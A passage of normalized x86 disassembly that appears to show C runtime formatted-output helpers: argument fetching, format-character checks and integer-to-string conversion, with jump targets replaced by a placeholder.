mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x4
add eax edx
push eax
call sub_427816
jmp r-xdata
sub_41a955
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov ecx [ ecx + 0x14 ]
push esi
mov esi [ ecx - 0x4 ]
mov edx [ ecx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
pop esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x4
add eax edx
push eax
call sub_427861
jmp r-xdata
sub_41a9e3
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov ecx [ ecx + 0x14 ]
push esi
mov esi [ ecx - 0x4 ]
mov edx [ ecx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
pop esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x4
add eax edx
push eax
call sub_4278ae
jmp r-xdata
sub_41aa71
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov al 0x1
pop ebp
retn 0x4
sub_41aa91
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov al 0x1
pop ebp
retn 0x4
sub_41aab1
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov al 0x1
pop ebp
retn 0x4
sub_41aad1
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov eax [ ecx + 0x14 ]
mov ecx [ eax - 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov al 0x1
pop ebp
retn 0x4
sub_41aaf1
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x14 ]
mov ecx [ esi - 0x8 ]
mov [ edx ] ecx
mov ecx [ esi - 0x4 ]
mov [ edx + 0x4 ] ecx
pop esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov edx [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x2
add eax edx
push eax
call sub_4277cb
jmp r-xdata
sub_41ab7f
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x14 ]
mov ecx [ esi - 0x8 ]
mov [ edx ] ecx
mov ecx [ esi - 0x4 ]
mov [ edx + 0x4 ] ecx
pop esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov edx [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x2
add eax edx
push eax
call sub_427816
jmp r-xdata
sub_41ac0d
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x14 ]
mov ecx [ esi - 0x8 ]
mov [ edx ] ecx
mov ecx [ esi - 0x4 ]
mov [ edx + 0x4 ] ecx
pop esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov edx [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x2
add eax edx
push eax
call sub_427861
jmp r-xdata
sub_41ac9b
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x14 ]
mov ecx [ esi - 0x8 ]
mov [ edx ] ecx
mov ecx [ esi - 0x4 ]
mov [ edx + 0x4 ] ecx
pop esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov edx [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x2
add eax edx
push eax
call sub_4278ae
jmp r-xdata
sub_41ad29
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx - 0x8 ]
mov [ ecx ] eax
mov eax [ edx - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41ad49
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx - 0x8 ]
mov [ ecx ] eax
mov eax [ edx - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41ad69
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx - 0x8 ]
mov [ ecx ] eax
mov eax [ edx - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41ad89
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx - 0x8 ]
mov [ ecx ] eax
mov eax [ edx - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41ada9
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x14 ]
mov ecx [ esi - 0x8 ]
mov [ edx ] ecx
mov ecx [ esi - 0x4 ]
mov [ edx + 0x4 ] ecx
pop esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov edx [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x2
add eax edx
push eax
call sub_4277cb
jmp r-xdata
sub_41ae37
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x14 ]
mov ecx [ esi - 0x8 ]
mov [ edx ] ecx
mov ecx [ esi - 0x4 ]
mov [ edx + 0x4 ] ecx
pop esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov edx [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x2
add eax edx
push eax
call sub_427816
jmp r-xdata
sub_41aec5
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x14 ]
mov ecx [ esi - 0x8 ]
mov [ edx ] ecx
mov ecx [ esi - 0x4 ]
mov [ edx + 0x4 ] ecx
pop esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov edx [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x2
add eax edx
push eax
call sub_427861
jmp r-xdata
sub_41af53
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x8
mov al 0x1
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x14 ]
mov ecx [ esi - 0x8 ]
mov [ edx ] ecx
mov ecx [ esi - 0x4 ]
mov [ edx + 0x4 ] ecx
pop esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov edx [ ecx + edx * 8 + 0x46c ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x2
add eax edx
push eax
call sub_4278ae
jmp r-xdata
sub_41afe1
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx - 0x8 ]
mov [ ecx ] eax
mov eax [ edx - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41b001
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx - 0x8 ]
mov [ ecx ] eax
mov eax [ edx - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41b021
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx - 0x8 ]
mov [ ecx ] eax
mov eax [ edx - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41b041
mov edi edi
push ebp
mov ebp esp
add [ ecx + 0x14 ] 0x8
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax [ edx - 0x8 ]
mov [ ecx ] eax
mov eax [ edx - 0x4 ]
mov [ ecx + 0x4 ] eax
mov al 0x1
pop ebp
retn 0x4
sub_41b061
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov dx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] dx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov cx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4277cb
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41b0e3
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov dx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] dx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov cx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x31 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427816
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41b165
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov dx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] dx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov cx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_427861
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41b1e7
mov edi edi
push ebp
mov ebp esp
cmp [ ecx + 0x45c ] 0x1
jne r-xdata
mov edx [ ecx + 0xaa8 ]
test edx edx
js r-xdata
add [ ecx + 0x14 ] 0x4
mov ecx [ ecx + 0x14 ]
mov dx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] dx
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor al al
cmp edx 0x64
jge r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x458 ] 0x1
jne r-xdata
add edx edx
mov eax [ ecx + edx * 8 + 0x46c ]
mov cx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
jmp r-xdata
push [ ecx + 0x2c ]
movzx eax [ ecx + 0x32 ]
push eax
shl edx 0x4
lea eax [ ecx + 0x464 ]
push 0x1
add eax edx
push eax
call sub_4278ae
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_41b309
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
cmp al 0x63
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp al 0x43
je r-xdata
xor eax eax
pop ebp
retn
sub_41b322
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
cmp al 0x63
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp al 0x43
je r-xdata
xor eax eax
pop ebp
retn
sub_41b33b
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x63
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x43
je r-xdata
xor eax eax
pop ebp
retn
sub_41b357
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x63
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x43
je r-xdata
xor eax eax
pop ebp
retn
sub_41b373
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
cmp al 0x64
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp al 0x69
je r-xdata
cmp al 0x6f
je r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
je r-xdata
cmp al 0x2a
je r-xdata
xor eax eax
pop ebp
retn
sub_41b3a0
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
cmp al 0x64
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp al 0x69
je r-xdata
cmp al 0x6f
je r-xdata
cmp al 0x75
je r-xdata
cmp al 0x78
je r-xdata
cmp al 0x58
je r-xdata
cmp al 0x2a
je r-xdata
xor eax eax
pop ebp
retn
sub_41b3cd
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
cmp ax 0x64
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp ax 0x69
je r-xdata
cmp ax 0x6f
je r-xdata
cmp ax 0x75
je r-xdata
cmp ax 0x78
je r-xdata
cmp ax 0x58
je r-xdata
cmp ax 0x2a
je r-xdata
xor eax eax
pop ebp
retn
sub_41b409
mov edi edi
push ebp
mov ebp esp
mov ax [ ebp + 0x8 ]
cmp ax 0x64
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp ax 0x69
je r-xdata
cmp ax 0x6f
je r-xdata
cmp ax 0x75
je r-xdata
cmp ax 0x78
je r-xdata
cmp ax 0x58
je r-xdata
cmp ax 0x2a
je r-xdata
xor eax eax
pop ebp
retn
sub_41b487
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
cmp al 0x73
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp al 0x53
je r-xdata
xor eax eax
pop ebp
retn
sub_41b4a0
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
cmp al 0x73
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp al 0x53
je r-xdata
xor eax eax
pop ebp
retn
sub_41b4b9
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x73
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x53
je r-xdata
xor eax eax
pop ebp
retn
sub_41b4d5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x73
je r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x53
je r-xdata
xor eax eax
pop ebp
retn
sub_41b4f1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
dec eax
sub eax 0x1
je r-xdata
xor al al
pop ebp
retn
sub eax 0x1
je r-xdata
mov al 0x1
pop ebp
retn
sub eax 0x9
je r-xdata
cmp [ ebp + 0x14 ] 0xd
je r-xdata
mov al [ ebp + 0x10 ]
cmp al 0x63
je r-xdata
mov cl 0x1
cmp al 0x73
je r-xdata
xor cl cl
jmp r-xdata
xor eax eax
test cl cl
sete al
pop ebp
retn
sub_41b531
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
dec eax
sub eax 0x1
je r-xdata
xor al al
pop ebp
retn
sub eax 0x1
je r-xdata
mov al 0x1
pop ebp
retn
sub eax 0x9
je r-xdata
cmp [ ebp + 0x14 ] 0xd
je r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
and eax 0x4
mov dl 0x1
or eax ecx
jne r-xdata
cmp [ ebp + 0x10 ] 0x63
je r-xdata
mov dl cl
mov cl 0x1
cmp [ ebp + 0x10 ] 0x73
jne r-xdata
xor eax eax
cmp dl cl
sete al
pop ebp
retn
sub_41b64c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
movsx eax [ eax ]
push eax
call sub_435b4c
pop ecx
pop ecx
pop ebp
retn
sub_41b666
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
push eax
call sub_435970
pop ecx
pop ecx
pop ebp
retn
sub_41b841
mov edi edi
push esi
mov esi ecx
push edi
mov edi [ esi + 0x404 ]
call sub_418f85
test edi edi
jne r-xdata
add eax edi
add eax esi
jmp r-xdata
pop edi
pop esi
retn
sub_41b85f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_434140
add esp 0xc
pop ebp
retn
sub_41b87d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_434260
add esp 0xc
pop ebp
retn
sub_41b89b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_434140
add esp 0xc
pop ebp
retn
sub_41b8b9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_434260
add esp 0xc
pop ebp
retn
sub_41b8d7
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41b94c
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41b9c1
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41ba36
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
xor edx edx
mov eax ebx
div [ ebp + 0xc ]
dec ecx
add dl 0x30
mov [ esi + 0x28 ] ecx
mov ebx eax
cmp dl 0x39
jle r-xdata
test ebx ebx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] dl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add dl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41baab
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_418f85
mov ebx [ ebp + 0x8 ]
dec eax
add edi eax
